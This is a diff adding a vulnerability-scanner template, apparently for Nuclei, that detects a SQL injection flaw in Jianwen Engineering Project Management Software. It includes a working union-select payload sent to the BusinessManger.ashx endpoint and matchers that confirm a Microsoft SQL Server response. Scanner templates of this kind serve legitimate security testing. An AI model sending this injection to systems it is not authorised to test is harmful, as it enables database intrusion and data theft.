@@ -1,0 +1,31 @@
+id: jianwen-engineering-project-management-sqli
+info:
+  name: Jianwen Engineering Project Management Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Jianwen Engineering Project Management Software is vulnerable to a SQL Injection vulnerability in the BusinessManger.ashx endpoint, allowing attackers to execute arbitrary SQL queries.
+
+http:
+  - raw:
+      - |
+        POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=PrjType&content=%' and 1=2 union select 1,(select+@@version);-- a
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "microsoft sql server"
+          - "CODE\":200,\"DATA\":"
+      - type: word
+        part: header
+        words:
+          - "text/plain"
